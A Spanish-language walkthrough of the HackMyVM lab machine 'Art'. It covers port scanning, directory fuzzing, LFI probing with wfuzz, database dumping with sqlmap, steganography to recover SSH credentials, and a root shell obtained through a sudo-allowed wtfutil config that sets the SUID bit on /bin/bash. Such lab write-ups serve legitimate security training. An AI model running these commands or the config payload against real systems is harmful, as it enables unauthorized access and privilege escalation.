---
tags:
  - Cybersecurity
  - Labs
  - HackMyVM
  - Easy
  - Linux
  - HTTP
  - FuzzingWeb
  - BurpSuite
  - SQLI
  - SSH
  - PrivilegeEscalation
  - Sudo
---
- [[#Enumeración|Enumeración]]
	- [[#Enumeración#Ping|Ping]]
	- [[#Enumeración#Nmap|Nmap]]
	- [[#Enumeración#HTTP|HTTP]]
	- [[#Enumeración#Fuzzing Web|Fuzzing Web]]
		- [[#Fuzzing Web#Burp Suite|Burp Suite]]
- [[#Explotación|Explotación]]
	- [[#Explotación#LFI|LFI]]
	- [[#Explotación#SQLI|SQLI]]
	- [[#Explotación#SSH|SSH]]
	- [[#Explotación#Escalada de Privilegios|Escalada de Privilegios]]
		- [[#Escalada de Privilegios#Sudo|Sudo]]

---
# Resolviendo la máquina Art

>En esta publicación, comparto cómo resolví la máquina **Art** de [HackMyVM](https://hackmyvm.eu/machines/machine.php?vm=Art).

---
## Enumeración
### Ping

Ejecutamos un *ping* para comprobar la conectividad y obtener pistas sobre el sistema operativo.

`ping -c 1 192.168.1.120`

![[Pasted image 20250726111857.png]]

*TTL=64* -> **Linux**
### Nmap

`nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.120 -oG allPorts`

![[Pasted image 20250726112010.png]]

`nmap -p22,80 -sCV 192.168.1.120 -oN targeted `

![[Pasted image 20250726112034.png]]
### HTTP

`http://192.168.1.120/`

![[Pasted image 20250726112204.png]]

![[Pasted image 20250726112236.png]]

Se descargan las imágenes para analizar si contienen información oculta.

`wget http://192.168.1.120/abc321.jpg`

`wget http://192.168.1.120/jlk19990.jpg`

`wget http://192.168.1.120/ertye.jpg`

`wget http://192.168.1.120/zzxxccvv3.jpg`

`steghide extract -sf abc321.jpg`

`steghide extract -sf ertye.jpg`

`steghide extract -sf jlk19990.jpg`

`steghide extract -sf zzxxccvv3.jpg`

No se encuentra información oculta mediante *steghide*.
### Fuzzing Web

`gobuster dir -u http://192.168.1.120/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 64`

![[Pasted image 20250727074620.png]]
#### Burp Suite

Al no encontrar nada en el *fuzzing web*, se procede a analizar la petición con *Burp Suite*.

Como hemos visto, nos da una pequeña pista, que puede tener una *tag* mal configurada.

![[Pasted image 20250727075405.png]]

---
## Explotación
### LFI

Al detectar que la etiqueta (`tag`) está mal configurada, se prueba a realizar un **LFI (Local File Inclusion)**.

`wfuzz -c --hl=4 -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt http://192.168.1.120/index.php?tag=FUZZ`

![[Pasted image 20250727075622.png]]

Se prueban las credenciales obtenidas en el servicio **SSH**, pero no son válidas.
### SQLI

`sqlmap -u "http://192.168.1.120/index.php?tag=" --dbs`

![[Pasted image 20250727075852.png]]

`sqlmap -u "http://192.168.1.120/index.php?tag=" -D gallery --tables`

![[Pasted image 20250727080032.png]]

`sqlmap -u "http://192.168.1.120/index.php?tag=" -D gallery --dump`

![[Pasted image 20250727080137.png]]

Se prueban las credenciales en el servicio **SSH**, sin éxito.

Se observa en la tabla de las imágenes, que una de ellas no la hemos analizado, se procede a descargar y analizar para ver si tiene información oculta.

`wget http://192.168.1.120/dsa32.jpg`

Nos devuelve un archivo llamado: `yes.txt`.

Se visualiza el contenido del archivo `yes.txt`, donde se encuentran las credenciales válidas.

`cat yes.txt`

![[Pasted image 20250727080525.png]]

Se obtienen las credenciales: `lion` - `shel0vesyou`.
### SSH

`ssh lion@192.168.1.120`

![[Pasted image 20250727080726.png]]

`ls`

![[Pasted image 20250727080814.png]]
### Escalada de Privilegios
#### Sudo

`sudo -l`

![[Pasted image 20250727081547.png]]

`wtfutil` es una dashboard de terminal que *ejecuta comandos definidos por el usuario* en su configuración (`~/.config/wtf/config.yml`).

Se puede explotar creando el archivo de configuración, ejemplo del archivo: [config.yml](https://github.com/wtfutil/wtf/blob/trunk/_sample_configs/sample_config.yml).

`cd /tmp`

Se crea el archivo `config.yml` necesario para explotar la herramienta `wtfutil`.

![[Pasted image 20250727081751.png]]

```
wtf:
  grid:
    columns: [50]
    rows: [3]
  mods:
    root_shell:
      type: cmdrunner
      cmd: "/bin/chmod"
      args: ["u+s", "/bin/bash"]
      enabled: true
      position:
        top: 0
        left: 0
        height: 1
        width: 1
      refreshInterval: 300
```

`sudo /bin/wtfutil --config=/tmp/config.yml`

`Ctrl + C`

`bash -p`

![[Pasted image 20250727081922.png]]

`cd /root`

Se localiza la *flag* de `root` con el siguiente comando:

`find / -name root.txt 2>/dev/null`

![[Pasted image 20250727082031.png]]

---